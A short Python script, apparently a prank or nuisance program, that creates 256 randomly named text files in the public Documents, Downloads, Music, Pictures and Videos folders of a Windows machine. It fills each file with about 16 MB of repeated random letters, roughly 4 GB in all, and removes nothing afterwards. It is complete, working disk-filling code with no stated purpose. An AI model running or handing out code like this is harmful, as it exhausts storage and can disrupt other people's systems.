import random

def txtfilegen():
    txtfile= "\\"
    for i in range(5):
        txtfile+= chr(random.randint(97,122))
    txtfile+= ".txt"
    return txtfile

def filelocgen():
    cdrive= r"C:\Users\Public"
    a= random.randint(1,5)
    midfile= "\\"
    if a==1:
        midfile+= "Documents"
    elif a==2:
        midfile+= "Downloads"
    elif a==3:
        midfile+= "Music"
    elif a==4:
        midfile+= "Pictures"
    else:
        midfile+= "Videos"
    tfile= txtfilegen()
    filelocation= cdrive+midfile+tfile
    return filelocation

n=256

for i in range(n):
    floc= filelocgen()
    file= open(floc,"w")
    file.close()
    for j in range(4):
        file= open(floc,"a")
        s= file.write(chr(random.randint(97,122))*4194304)
        file.close()
